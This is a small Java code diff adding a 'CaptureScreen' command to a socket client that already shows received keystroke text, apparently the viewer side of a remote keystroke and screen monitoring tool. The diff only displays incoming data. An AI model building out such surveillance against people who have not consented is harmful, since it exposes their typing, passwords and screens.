@@ -1,3 +1,4 @@
+import java.awt.image.BufferedImage;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
@@ -6,6 +7,7 @@ import java.io.ObjectInputStream;
 import java.net.Socket;
 import java.net.SocketException;
 
+import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
 public class Client {
@@ -47,6 +49,9 @@ public class Client {
             if (cmd.equalsIgnoreCase("ViewKey")) {
                 String text = (String) ReceiveData();
                 appDesign.keyStroke.ApplyText(text);
+            } else if (cmd.equalsIgnoreCase("CaptureScreen")) {
+                BufferedImage bi = ScreenCapture.ConvertString((String)ReceiveData());
+                appDesign.screenCapture.SetImage(new ImageIcon(bi));
             }
         }
     }
